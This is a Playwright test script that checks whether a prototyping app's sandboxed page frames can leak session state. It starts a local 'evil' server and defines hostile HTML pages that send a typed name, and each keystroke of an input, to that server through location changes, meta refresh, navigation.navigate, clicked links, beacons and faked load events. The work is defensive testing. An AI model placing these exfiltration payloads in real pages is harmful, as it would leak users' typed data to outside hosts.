// Headless check that a prototype page cannot leak data by navigating its own frame.
//
//   node scripts/page-leak.mjs [--mode srcdoc]       default: pages are srcdoc frames, no sandbox server
//   node scripts/page-leak.mjs --mode strict         start the sandbox server too: pages on sandbox origins
//   node scripts/page-leak.mjs --app http://localhost:5291 [--expect leak]
//                                                    test an app that is already running (an older checkout)
//
// A throwaway "evil" server on 127.0.0.1 records every request. Evil pages try to send the session
// state (a name typed into another page) to it: `location = …`, a meta refresh, `navigation.navigate`,
// a clicked link, and more (below). Vectors:
//   idle      the pages above as idle thumbnails (no click), state "Ada Secret" set elsewhere
//   typed     an interactive page that navigates on every keystroke
//   play      a page reached in Play, after the name was typed in Play, that reads canvas.state
//   n204 / download / stop (+ play versions)   navigations that commit no document (204, attachment, window.stop()), repeated every 100 ms
//   beacon / playbeacon   a navigation to a page that itself requests every 100 ms; expect 1 request in all, the frame removed first
//   fakeload / fakeplay   the same, from a thumbnail / in Play, after faking the page's own `load` event
// Expected, by mode (the idle row follows IDLE_THUMBNAIL_SCRIPTS in src/sandbox/srcdoc.ts, read off the
// frames' sandbox attribute):
//   strict                         0 requests everywhere (the frame host cancels every navigation)
//   srcdoc, idle scripts off       idle: 0 requests, pages still render; typed, play: <= 1 request, then the frame is removed
//   srcdoc, idle scripts on        idle: <= 1 request per page, carrying NO state, then the frame is removed;
//                                  typed, play: <= 1 request, then the frame is removed
// In srcdoc mode Esc still closes Play after the frame was removed. Exit code 1 on a difference.

import http from 'node:http';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { chromium } from 'playwright-core';

const args = process.argv.slice(2);
const opt = (name, dflt) => (args.includes(name) ? args[args.indexOf(name) + 1] : dflt);
const expect = opt('--expect', 'blocked');
const mode = opt('--mode', 'srcdoc');
if (!['srcdoc', 'strict'].includes(mode)) throw new Error('--mode is srcdoc or strict');
const freePort = () => new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });

// ---- the evil server
const hits = [];
const hung = [];
const evilPort = Number(opt('--evil-port', 0)) || (await freePort());
http
  .createServer((req, res) => {
    hits.push(req.url);
    const p = req.url.split('?')[0];
    if (p.endsWith('x')) return void res.writeHead(204).end(); // the beacon document's follow-up requests
    if (p.includes('204')) return void res.writeHead(204).end(); // a navigation that commits no document
    if (p.includes('download')) return void res.writeHead(200, { 'content-type': 'text/plain', 'content-disposition': 'attachment; filename=x.txt' }).end('x');
    if (p.includes('stop')) return void hung.push(res); // never answers
    if (p.includes('beacon')) return void res.writeHead(200, { 'content-type': 'text/html' }).end(`<h1>EVIL</h1><script>setInterval(() => fetch('${p}x?b=1'), 100)</script>`);
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end('<h1 style="color:red">EVIL SITE</h1>');
  })
  .listen(evilPort, '127.0.0.1');
const EVIL = `http://127.0.0.1:${evilPort}`;

// ---- the app (ours, or one already running)
let appUrl = opt('--app');
const stops = [];
if (!appUrl) {
  delete process.env.VITE_SANDBOX_URL;
  delete process.env.VITE_SANDBOX_PORT;
  if (mode === 'strict') {
    const sbx = Number(opt('--sandbox-port', 0)) || (await freePort());
    const srv = spawn(process.execPath, ['sandbox/server.mjs', '--port', String(sbx)], { stdio: ['ignore', 'pipe', 'inherit'] });
    stops.push(() => srv.kill());
    await new Promise((r) => srv.stdout.once('data', r));
    process.env.VITE_SANDBOX_URL = `http://{label}.localhost:${sbx}`;
  }
  const { createServer } = await import('vite');
  const vite = await createServer({ server: { port: Number(opt('--app-port', 0)), host: '127.0.0.1' }, logLevel: 'error' });
  await vite.listen();
  stops.push(() => vite.close());
  appUrl = `http://localhost:${vite.httpServer.address().port}`;
}

const state = `JSON.stringify(canvas.state)`;
const loop = (k, stop = false) => `<h1>Innocent</h1><script>setInterval(() => { location.href = ${JSON.stringify(EVIL)} + '/${k}?s=' + encodeURIComponent(${state});${stop ? ' setTimeout(() => window.stop(), 30);' : ''} }, 100);</script>`;
const hashPage = () => `<h1>Innocent</h1><div style="height:3000px"></div><h2 id="sec">sec</h2><script>addEventListener('hashchange', () => { document.body.dataset.hc = (+document.body.dataset.hc || 0) + 1; }); setTimeout(() => { for (const h of ['#sec', ' #', '#']) { const a = document.createElement('a'); a.href = h; document.body.append(a); a.click(); } }, 300);</script>`;
const evil = {
  location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
  meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
  navigation: `<h1>Innocent</h1><script>navigation.navigate(${JSON.stringify(EVIL)} + '/navigation?s=' + encodeURIComponent(${state}));</script>`,
  link: `<h1>Innocent</h1><script>const a = document.createElement('a'); a.href = ${JSON.stringify(EVIL)} + '/link?s=' + encodeURIComponent(${state}); document.body.append(a); a.click();</script>`,
  play: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/play?s=' + encodeURIComponent(${state});</script>`,
  // in-page links must keep working: scroll, 0 requests, frame stays
  hash: hashPage(),
  playhash: hashPage(),
  // navigations that never load a document (so no `load` fires on the frame), repeated, and one that lands on a page that beacons
  n204: loop('n204'),
  download: loop('download'),
  stop: loop('stop', true),
  beacon: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/beacon?s=' + encodeURIComponent(${state});</script>`,
  play204: loop('play204'),
  playdownload: loop('playdownload'),
  playstop: loop('playstop', true),
  playbeacon: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/playbeacon?s=' + encodeURIComponent(${state});</script>`,
  // a page that fakes its own `load` event (to look vouched for) and then leaves
  fakeload: `<h1>Innocent</h1><script>dispatchEvent(new Event('load')); location.href = ${JSON.stringify(EVIL)} + '/fakeload?s=' + encodeURIComponent(${state});</script>`,
  fakeplay: `<h1>Innocent</h1><script>dispatchEvent(new Event('load')); location.href = ${JSON.stringify(EVIL)} + '/fakeplay?s=' + encodeURIComponent(${state});</script>`,
  typed: `<input id="i" placeholder="type here"><script>i.oninput = () => { location.href = ${JSON.stringify(EVIL)} + '/typed?v=' + encodeURIComponent(i.value); };</script>`,
};

const browser = await chromium.launch({ channel: 'chrome', headless: true });
let code = 0;
// a stuck browser call must end the run with a message, not hang it
const watchdog = setTimeout(() => { console.error(`FAIL (${mode}): no result after 4 minutes (stuck browser call?)`); process.exit(1); }, 240_000);
watchdog.unref?.();
try {
  const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
  page.setDefaultTimeout(20_000);
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  await page.goto(appUrl);
  await page.waitForFunction(() => window.app?.dispatch, null, { timeout: 30_000 });
  await page.evaluate(() => {
    app.store.load({ nodes: [], edges: [] });
    app.dispatch('page.seed', { x: 0, y: 0 });
  });
  const seeded = await page.evaluate(() => app.doc.nodes.map((n) => [n.id, n['x-page']?.title]).filter((x) => x[1]));
  const signup = seeded.find((x) => x[1] === 'Sign up')?.[0];
  if (!signup) throw new Error('seed has no Sign up page');

  // put "Ada" into the session state the way a person would: interact with the Sign up page and type
  await page.evaluate(() => app.view.fit());
  const box = page.locator(`[data-node-id="${signup}"]`);
  await box.locator('[data-action="live"]').click();
  const form = box.frameLocator('iframe');
  await form.locator('[data-store="name"]').fill('Ada Secret');
  await page.waitForTimeout(300);

  // which flavour do idle thumbnails have? (read off a frame before any evil page exists)
  const idleSandbox = await page.evaluate(() => document.querySelector('iframe.pg-frame')?.getAttribute('sandbox') ?? null);
  const idleScripts = mode === 'strict' ? true : idleSandbox !== '';
  console.log(`mode ${mode}; idle thumbnails: sandbox="${idleSandbox}" (${mode === 'strict' ? 'scripts on, navigation guard' : idleScripts ? 'scripts ON, no state' : 'scripts OFF'})`);

  // the evil pages, as idle thumbnails
  const navKeys = ['location', 'meta', 'navigation', 'link', 'fakeload', 'n204', 'download', 'stop', 'beacon'];
  const benignKeys = ['hash'];
  const idleKeys = [...navKeys, ...benignKeys, 'typed'];
  await page.evaluate(({ evil, idleKeys }) => {
    let i = 0;
    for (const k of idleKeys) app.dispatch('page.create', { x: 1800 + (i++) * 260, y: 0, title: 'Evil ' + k, html: evil[k] });
  }, { evil, idleKeys });
  await page.waitForTimeout(3000);
  const idle = [...hits];

  // typing into an interactive evil page
  const idOf = (k) => page.evaluate((k) => app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id, k);
  const typedId = await idOf('typed');
  await page.evaluate((id) => { app.store.select([id]); app.view.fit(60, app.doc.nodes.filter((n) => n.id === id)); }, typedId);
  const t = page.locator(`[data-node-id="${typedId}"]`);
  await t.locator('[data-action="live"]').click();
  await t.frameLocator('iframe').locator('#i').pressSequentially('hunter2', { delay: 60 }).catch(() => {}); // the frame may be removed under us
  await page.waitForTimeout(1500);

  // control: the pages really rendered and stayed put (blocked is not "never loaded"), or were removed
  const leaked = (name) => hits.filter((h) => { const p = h.split('?')[0]; return p === '/' + name || p === '/' + name + 'x'; }); // `x`: a beacon page's follow-up requests
  const stateOf = (h) => decodeURIComponent(h.split('?s=')[1] ?? '');
  const nav = {};
  for (const k of navKeys) {
    const id = await idOf(k);
    const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
    nav[k] = { intact: text === 'Innocent', gone: (await page.locator(`[data-node-id="${id}"] .pg-gone`).count()) > 0, requests: leaked(k).length };
  }
  const benign = {};
  for (const k of benignKeys) {
    const id = await idOf(k);
    const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
    const hc = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('body').getAttribute('data-hc', { timeout: 1500 }).catch(() => null);
    benign[k] = { intact: text === 'Innocent', requests: leaked(k).length, hashchange: Number(hc) >= 1 };
  }
  const typedValue = await t.frameLocator('iframe').locator('#i').inputValue({ timeout: 1500 }).catch(() => null);
  const typedGone = (await t.locator('.pg-gone').count()) > 0;
  const beforePlay = hits.length;

  // Play: name typed in Play, then a page that reads canvas.state and leaves. Each Play page also sits
  // on the canvas as an idle thumbnail; that request has no state, the Play one carries the name.
  const playKeys = ['play', 'fakeplay', 'play204', 'playdownload', 'playstop', 'playbeacon'];
  const playBenign = ['playhash'];
  const dev = page.locator('.pg-device');
  const playRes = {};
  // Pages that loop on a navigation keep the browser busy, so each one is added just before its run and removed after it
  // (and the idle evil pages are removed first): a pile of them once stalled the strict-mode run.
  await page.evaluate((titles) => app.dispatch('core.delete', { ids: app.doc.nodes.filter((n) => titles.includes(n['x-page']?.title)).map((n) => n.id) }), idleKeys.map((k) => 'Evil ' + k));
  for (const k of [...playKeys, ...playBenign]) {
    await page.evaluate(({ html, signupId, k }) => {
      app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil ' + k, html });
      const id = app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id;
      app.dispatch('page.link', { from: signupId, to: id, label: 'Go ' + k });
    }, { html: evil[k], signupId: signup, k });
    await page.evaluate((id) => app.prototype.player.start(id), signup);
    await dev.frameLocator('iframe').locator('[data-store="name"]').fill('Ada Secret');
    await page.waitForTimeout(300);
    await page.locator('.pg-chip', { hasText: new RegExp(`→\\s+Evil ${k}$`) }).click();
    await page.waitForTimeout(2500);
    const r = { hashchange: Number(await dev.frameLocator('iframe').locator('body').getAttribute('data-hc', { timeout: 1000 }).catch(() => null)) >= 1, gone: (await dev.locator('.pg-gone').count()) > 0, still: await dev.frameLocator('iframe').locator('h1').textContent({ timeout: 1000 }).catch(() => null) };
    await page.keyboard.press('Escape');
    await page.waitForTimeout(300);
    r.closed = !(await page.evaluate(() => app.prototype.player.isOpen));
    r.hits = leaked(k).filter((h) => stateOf(h) !== '{}');
    playRes[k] = r;
    await page.evaluate((k) => app.dispatch('core.delete', { ids: app.doc.nodes.filter((n) => n['x-page']?.title === 'Evil ' + k).map((n) => n.id) }), k);
  }

  // srcdoc: the runtime sets the hash, so hashchange fires. Strict: the frame host's navigation guard cancels every navigation, fragment ones too (known, nothing leaks).
  const hashWorks = mode === 'srcdoc';
  const benignOk = benignKeys.every((k) => benign[k].intact && (benign[k].hashchange || !hashWorks || !idleScripts) && benign[k].requests === 0) && playBenign.every((k) => playRes[k].still === 'Innocent' && (playRes[k].hashchange || !hashWorks) && !playRes[k].gone && playRes[k].hits.length === 0 && playRes[k].closed);
  console.log(`in-page links: idle ${JSON.stringify(benign)}; Play ${JSON.stringify(Object.fromEntries(playBenign.map((k) => [k, { still: playRes[k].still, removed: playRes[k].gone }])))}`);
  const rows = [...idleKeys.map((k) => [k, leaked(k)]), ...playKeys.map((k) => [k, playRes[k].hits])];
  for (const k of navKeys) console.log(`idle ${k}: shows own content ${nav[k].intact}, frame removed ${nav[k].gone}`);
  console.log(`typed: interactive input holds "${typedValue}", frame removed: ${typedGone}`);
  for (const k of playKeys) console.log(`${k}: frame removed: ${playRes[k].gone}, page still showing: ${playRes[k].still}, Esc closed Play: ${playRes[k].closed}`);
  for (const [k, l] of rows) console.log(`${k.padEnd(11)} ${l.length ? `${l.length} request(s)  ` + decodeURIComponent(l[0]).slice(0, 90) : 'blocked'}`);
  console.log(`idle thumbnails: ${idle.length} request(s) to the evil server; after typing: ${beforePlay}; after Play: ${hits.length}`);
  if (errors.length) console.log('page errors:', errors.join(' | '));
  const checks = [];
  const check = (name, v) => checks.push([name, !!v]);
  const allNav = (f) => navKeys.every((k) => f(nav[k], k));
  const playsOk = (strict) => playKeys.every((k) => (strict ? playRes[k].still === 'Innocent' : playRes[k].hits.length === 1 && playRes[k].gone && playRes[k].hits[0].includes('Ada')) && playRes[k].closed);
  check('in-page links (#sec, #) keep the frame and send nothing', benignOk);
  if (expect === 'leak') {
    check('old app leaks from idle thumbnails', hits.length > 0 && idle.length > 0);
  } else if (mode === 'strict') {
    check('no request at all', hits.length === 0);
    check('idle pages render', allNav((n) => n.intact));
    check('interactive input keeps typing', typedValue === 'hunter2');
    check('Play pages stay and Esc closes Play', playsOk(true));
  } else if (!idleScripts) {
    check('idle: 0 requests', idle.length === 0);
    check('idle pages render (no scripts)', allNav((n) => n.intact));
    check('typed: <= 1 request, frame removed', leaked('typed').length <= 1 && typedGone);
    check('Play: exactly the accepted request (the Play state), frame removed, Esc closes Play', playsOk(false));
  } else {
    check('idle: <= 1 request per page', allNav((n) => n.requests <= 1));
    check('idle: a request means the frame was removed', allNav((n) => n.requests === 0 || n.gone));
    check('idle: no request carries state', idle.every((h) => !h.includes('Ada') && (h.startsWith('/typed') || stateOf(h) === '{}')));
    check('typed: <= 1 request, frame removed', leaked('typed').length <= 1 && typedGone);
    check('Play: exactly the accepted request (the Play state), frame removed, Esc closes Play', playsOk(false));
  }
  for (const [n, v] of checks) console.log(`${v ? 'ok  ' : 'FAIL'} ${n}`);
  const ok = checks.every(([, v]) => v);
  console.log(ok ? `OK (${mode}${expect === 'leak' ? ', expected leak' : ''})` : `FAIL (${mode})`);
  if (!ok) code = 1;
} catch (e) {
  console.error(e);
  code = 1;
} finally {
  await browser.close();
  for (const r of hung) r.destroy();
  for (const s of stops) await s();
  setTimeout(() => process.exit(code), 100);
}
